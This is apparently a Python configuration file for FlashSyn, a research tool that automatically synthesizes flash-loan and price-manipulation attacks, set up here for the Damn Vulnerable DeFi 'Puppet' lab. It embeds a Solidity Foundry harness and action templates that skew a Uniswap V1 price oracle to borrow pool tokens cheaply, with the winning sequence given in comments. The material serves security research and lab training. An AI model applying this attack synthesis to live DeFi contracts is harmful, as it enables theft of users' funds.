import sys
import os
import time
import config

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
sys.path.append(os.path.dirname(os.path.dirname(SCRIPT_DIR)))

from Actions.Utils import *
from Actions.UtilsDVD import *  # DVD represents "Damn Vulnerable DeFi"
from Actions.UtilsPrecision import *

from synthesizer import *



ILLEGALPOINT = -2
LEGALPOINT = 1
INTERPOLATION = 0
POLYNOMIAL = 1
ETH = 0
BSC = 1
DVD = 2
FANTOM = 3


class puppetAction():
    # This is a vector of global states  
    # For example, for example puppet, we only defined three global state
    # which is, Uniswap DVT reserve, ETH reserve, PuppetPool reserve
    initialStates = [10, 10, 100000]  # To be defined
    globalStates = initialStates.copy() # Don't change


    initialBalances = {"DVT": 1000, "ETH": 25} # To be defined
    ## initial balances of the attacker
    currentBalances = initialBalances.copy() # Don't change

    # Used to calculate the profit = (weighted sum of final balances - 
    # ETH and DVT are the only tokens of interest
    TokenPrices = {"ETH": 1000.0, "DVT": 1.0} # To be defined
    TargetTokens = TokenPrices.keys()  # token of interest

    # To be defined 
    # It is the start of the foundry script above all testExample_ functions
    start_str = '''// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../Contracts/puppet/PuppetPool.sol";
import {Strings} from "openzeppelin-contracts/utils/Strings.sol";
import "ds-test/test.sol";


interface UniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        view
        returns (uint256);
    
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline)  external payable returns (uint256);

}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract PuppetV1 is DSTest, stdCheats {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal attacker;

    uint256 DVTasked;
    uint256 ethNeed;

    uint DVTspent;
    uint256 ethGot;

    string str89;
    string str90;
    string str91;


    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        uniswapV1Factory = UniswapV1Factory(
            deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
        );

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(
            deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json")
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapExchange = UniswapV1Exchange(
            uniswapV1Factory.createExchange(address(dvt))
        );

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            DEADLINE // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );
        vm.startPrank(attacker);
        dvt.approve(address(uniswapExchange), 2 ** 256 - 1);
        
        // console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }
    

    function UniswapSummary() public view returns  (string memory _uintAsString){
        uint balance1 = dvt.balanceOf(address(uniswapExchange)) / 10 ** 18;
        uint balance2 = address(uniswapExchange).balance / 10 ** 18;
        return appendWithSpace(appendWithSpace("DVT: ", uint2str(balance1)), appendWithSpace("ETH: ", uint2str(balance2)));
    }

    function puppetPoolSummary() public view returns  (string memory _uintAsString){
        uint balance = dvt.balanceOf(address(puppetPool)) / 10 ** 18;
        return appendWithSpace("DVT reserve: ", uint2str(balance));
    }

    function ProfitSummary() public view returns  (string memory _uintAsString){
        uint balance = dvt.balanceOf(attacker) / 10 ** 18;
        uint balance2 = address(attacker).balance / 10 ** 18;
        return appendWithSpace(appendWithSpace("DVT: ", uint2str(balance)), appendWithSpace("ETH: ", uint2str(balance2)));

        // original balances:
        // Uniswap V1: 10 DVT  10 ETH
        // attacker: 1000 DVT  25 ETH
        // puppetPool: 100_000 DVT
        // 1 ether = 1000 DVT
        // Try to get as many DVT as possible while keeping ETH as much as possible 
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) internal returns (uint256) {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        return Strings.toString(_i);
    }
                
                
    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }
                
    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


    '''

    # Don't change for hypothetical cases
    # Needed for an attack synthesis on real blockchain
    attack_str = ""
    collector_str = ""


    # Don't change
    # Reset all global states to initial values, for a new round of optimization
    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    # To be defined 
    def calcProfit(stats):
        # Sometimes the revert string could contain a integer error code.
        # In this case, we return 0 as the profit.        
        if stats == None or len(stats) != 2:
            return 0
        # We choose to calculate profit here because it's hard to handle 
        # integer subtraction in the Solidity.
        DVT_earned = stats[0] - puppetAction.initialBalances['DVT']
        ETH_earned = stats[1] - puppetAction.initialBalances['ETH']
        
        return DVT_earned + ETH_earned * 1000.0

    # Don't change
    # Calculate profit based on the token prices defined
    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit


    # Don't change
    # Used to construct the foundry script
    @classmethod
    def buildAttackContract(cls, ActionList):
        cls.attack_str = buildDVDattackContract(ActionList) + "       revert(ProfitSummary());\n"
        return cls.attack_str
    
    # Don't change
    # Used to construct the foundry script
    @classmethod
    def buildCollectorContract(cls, ActionList):
        cls.collector_str = buildDVDCollectorContract(ActionList)
        return cls.collector_str

    # Don't change
    def ToString(ActionList):
        return ToString(ActionList)

    # To be defined 
    # Used to collect initial round of data points
    def initialPass():
        action1 = SwapUniswapDVT2ETH
        action2 = PoolBorrow
        action3 = SwapUniswapETH2DVT

        action_list_1 = [action1, action2, action3]

        # prestate_dependency means executing the actions inside the actionX_prestate_dependency vector 
        # will alter the prestates of actionX. It is used to reach a wider range of data points
        # If you are unsure about the prestates, just list all actions inside the actionX_prestate_dependency
        action1_prestate_dependency = [action2, action3]
        action2_prestate_dependency = [action1, action3]
        action3_prestate_dependency = [action1, action2]
        
        # seq of actions
        ActionWrapper = puppetAction
        action_lists = [action3_prestate_dependency + [action3], \
                        action1_prestate_dependency + [action1], \
                        action2_prestate_dependency + [action2]]
        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    def runinitialPass():
        return


class SwapUniswapETH2DVT(puppetAction):
    
    # To be defined
    # how many values needed to approximate (poststates, tokenIn, tokenOut)
    values = [[], [], []]

    # one approximator for one value
    approximator0 = None
    approximator1 = None
    approximator2 = None

    # To be defined
    numInputs = 1      # num of parameters undetermined
    tokensIn = ['ETH']      # the token taken from the attacker
    tokensOut = ['DVT']     # the token given to the attacker
    range = [0, 50]        # a range of parameters we would like FlashSyn to try

    # Don't change 
    hasNewDataPoints = True
    points = []

    # To be defined
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapETH2DVT\n"
        action += '''       uniswapExchange.ethToTokenSwapInput{value: $$e18}(1, 0xffffffff);\n'''
        return action

    # To be defined
    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = "      // Collect: SwapUniswapETH2DVT\n"
        action += '''       uint DVTgot = dvt.balanceOf(address(attacker));\n'''
        action += '''       str89 = UniswapSummary();\n'''
        action += '''       uniswapExchange.ethToTokenSwapInput{value: $$e18}(1, 0xffffffff);\n'''
        action += '''       str90 = UniswapSummary();\n'''
        action += '''       DVTgot = dvt.balanceOf(address(attacker)) - DVTgot;\n'''
        action += '''       revert( appendWithSpace( str89, appendWithSpace( str90, uint2str(DVTgot / 10 ** 18) ) ) );\n'''
        return action

    # To be defined
    # How to handle the values from the collector
    @classmethod
    def aliquotValues(cls, values):
        return values[2], values[3], values[4]
    
    # To be defined
    # After reading integers from the collector string
    # How to use these integers
    @classmethod
    def add1PointValue(cls, inputs, values):
        # Sometimes the revert string could contain a integer error code.
        # We need to filter out these cases.
        if values == None or len(values) != 5:
            return
        
        # Prestate + inputs, it is one point
        point = [values[0], values[1], inputs[-1]]

        # Check if the point is already in the list
        if point in cls.points:
            return ILLEGALPOINT

        cls.points.append(point) # DVT reserve, ETH reserve
        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0) # DVT reserve
        cls.values[1].append(v1) # ETH reserve
        cls.values[2].append(v2) # DVT got
        cls.hasNewDataPoints = True
        return LEGALPOINT

    # To be defined
    @classmethod
    def refreshTransitFormula(cls):
        # Refresh the approximator with the new data points
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])  # Sometimes we know value[1] = f(points[1])
                                                                              # instead of value[1] = f(points[0], points[1])
                                                                              # then we can specify it by adding a third parameter [1] 
        cls.hasNewDataPoints = False
    
    # To be defined
    # Given input and global state
    # How to call approximate function to get values
    @classmethod
    def simulate(cls, input):
        # Calculate the output with the approximators
        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2


    # To be defined
    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, input):
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances["ETH"] -= input
        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.currentBalances["DVT"] += output2
        return 

    # Don't change
    @classmethod
    def string(cls):
        return cls.__name__



class SwapUniswapDVT2ETH(puppetAction):
    # To be defined
    # how many values needed to approximate (poststates, tokenIn, tokenOut)
    values = [[], [], []]

    # one approximator for one value
    approximator0 = None
    approximator1 = None
    approximator2 = None

    # To be defined
    numInputs = 1       # num of parameters undetermined
    tokensIn = ['DVT']  # the token taken from the attacker
    tokensOut = ['ETH']     # the token given to the attacker
    range = [0, 1000]       # a range of parameters we would like FlashSyn to try
    # add range2 if needed

    # Don't change 
    hasNewDataPoints = True
    points = []


    # To be defined
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapDVT2ETH\n"
        action += '''       uniswapExchange.tokenToEthSwapInput($$e18, 1, 0xffffffff);\n'''
        return action

    # To be defined
    # part of foundry script used to collect data points for the act
    @classmethod
    def collectorStr(cls):
        action = "      // Collect: SwapUniswapDVT2ETH\n"
        action += '''       ethGot = attacker.balance;\n'''
        action += '''       str89 = UniswapSummary();\n'''
        action += '''       uniswapExchange.tokenToEthSwapInput($$e18, 1, 0xffffffff);\n'''
        action += '''       str90 = UniswapSummary();\n'''
        action += '''       ethGot = attacker.balance - ethGot;\n'''
        action += '''       revert( appendWithSpace( str89, appendWithSpace( str90, uint2str(ethGot / 10 ** 18) ) ) );\n'''
        return action

    # To be defined
    # How to handle the values from the collector
    @classmethod
    def aliquotValues(cls, values):
        return values[2], values[3], values[4]
    
    # To be defined
    # After reading integers from the collector string
    # How to use these integers
    @classmethod
    def add1PointValue(cls, inputs, values):
        # Sometimes the revert string could contain a integer error code.
        # We need to filter out these cases.
        if values == None or len(values) != 5:  # 5 means the expected integers in a collector string
            return

        # Prestate + inputs, it is one point
        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return ILLEGALPOINT

        # Check if the point is already in the list
        cls.points.append(point) # DVT reserve, ETH reserve

        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0) # DVT reserve  globalState
        cls.values[1].append(v1) # ETH reserve  globalState
        cls.values[2].append(v2) # ETH got

        cls.hasNewDataPoints = True
        return LEGALPOINT

    # To be defined
    @classmethod
    def refreshTransitFormula(cls):
        # Refresh the approximator with the new data points
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False
    

    # To be defined
    # Given input and global state
    # How to call approximate function to get values
    @classmethod
    def simulate(cls, input):
        # Calculate the output with the approximators
        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        # We can also list precise expressions here, get rid of approximations
        return output0, output1, output2

    # To be defined
    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balance
    @classmethod
    def transit(cls, input):
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances["DVT"] -= input

        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.currentBalances["ETH"] += output2
        return 


    # Don't change
    @classmethod
    def string(cls):
        return cls.__name__
    


class PoolBorrow(puppetAction):
    # To be defined
    # how many values needed to approximate (poststates, tokenIn, tokenOut)
    values = [[], []]

    # one approximator for one value
    approximator0 = None
    approximator1 = None
    
    # To be defined
    numInputs = 1       # num of parameters undetermined
    tokensIn = ['ETH']       # the token taken from the attacker
    tokensOut = ['DVT']      # the token given to the attacker
    range = [0, 100000]      # a range of parameters we would like FlashSyn to try
    
    # Don't change 
    # Used for other modules
    hasNewDataPoints = True
    points = []

    # To be defined
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = "      // Action: PoolBorrow\n"
        action += '''       ethGot = $$e18;\n'''
        action += '''       ethNeed = puppetPool.calculateDepositRequired( ethGot );\n'''
        action += '''       puppetPool.borrow{value: ethNeed}( ethGot );\n'''
        return action

    # To be defined
    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = "      // Collect: PoolBorrow\n"
        action += '''       str89 = UniswapSummary();\n'''
        action += '''       str90 = puppetPoolSummary();\n'''
        action += '''       ethGot = $$e18;\n'''
        action += '''       ethNeed = puppetPool.calculateDepositRequired( ethGot );\n'''
        action += '''       puppetPool.borrow{value: ethNeed}( ethGot );\n'''
        action += '''       str91 = puppetPoolSummary();\n'''
        action += '''       str90 = appendWithSpace( str90, str91 );\n'''
        action += '''       revert( appendWithSpace( str89, appendWithSpace( str90, uint2str(ethNeed / 10 ** 18) ) ) );\n'''
        return action       

    # To be defined
    # How to handle the values from the collector
    @classmethod
    def aliquotValues(cls, values):
        return values[3], values[4]

    # To be defined
    # After reading integers from the collector string
    # How to use these integers
    @classmethod
    def add1PointValue(cls, inputs, values):
        # Sometimes the revert string could contain a integer error code.
        # We need to filter out these cases.
        if values == None or len(values) != 5:  # 5 means the expected integers in a collector string
            return

        # Prestate + inputs, it is one point
        point = [values[0], values[1], values[2], inputs[-1]]

        # Check if the point is already in the list
        if point in cls.points:
            return ILLEGALPOINT

        cls.points.append(point) # DVT reserve, ETH reserve
        
        v0, v1 = cls.aliquotValues(values)
        cls.values[0].append(v0) # Pool reserve after action
        cls.values[1].append(v1) # ETH needed

        cls.hasNewDataPoints = True
        return LEGALPOINT

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [2,3])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0,1,3])     # Sometimes we know value[1] = f(points[0], points[1], points[3])
                                                                                          # instead of value[1] = f(points[0], points[1],points[2], points[3])
                                                                                        # then we can specify it by adding a third parameter [0,1, 3] 
        cls.hasNewDataPoints = False

    # To be defined
    # Given input and global state
    # How to call approximate function to get values
    @classmethod
    def simulate(cls, input):
        # Calculate the output with the approximators
        inputs1 = [cls.globalStates[2], input]
        inputs2 = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs1)
        output1 = cls.approximator1(inputs2)
        # we can also list precise expressions here

        return output0, output1
        
    # To be defined
    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, input):
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        
        cls.currentBalances["DVT"] += input
        output0, output1 = cls.simulate(input)
        cls.globalStates[2] = output0
        cls.currentBalances["ETH"] -= output1
        return



    # Don't change
    @classmethod
    def string(cls):
        return cls.__name__
    


def main():

    # config.method
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    # 0 for intepolation, 1 for polynomial
    config.method = 0
    config.ETHorBSCorDVDorFantom = 2  # 0 for ETH, 1 for BSC, 2 for DVD

    config.benchmarkName = "puppet"
    config.processNum = 1
    # for local test, we need to define config.command to execute Foundry
    # for tests on a forked blockchain, the Foundry command will be automatically 
    # generated using config.blockNum and config.ETHorBSCorDVDorFantom
    config.command = "forge test --match-contract PuppetV1"


    # ==========================================================================================================================
    # Collect initial round of data points
    puppetAction.initialPass()

    # ==========================================================================================================================
    puppetAction.runinitialPass()


    actions = [SwapUniswapDVT2ETH, SwapUniswapETH2DVT, PoolBorrow]
    CounterExampleLoop = True
    Pruning = True
    maxSynthesisLen = 3

    Synthesizer = synthesizer(actions, puppetAction, config.processNum)
    Synthesizer.synthesis(maxSynthesisLen, Pruning, CounterExampleLoop)



    # ==========================================================================================================================

    # # Below is the ground truth for the puppet contract, FlashSyn does not use it during the synthesis process
    # # It is purely used for debugging purpose during the development of FlashSyn


    # action1 = SwapUniswapDVT2ETH
    # action2 = PoolBorrow

    # ActionWrapper = puppetAction

    # action_list = [action1, action2]
    # initial_guess = [1000, 100000]
    
    # # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    # actual_profit = 89000.0
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4



if __name__ == "__main__":
    main()
    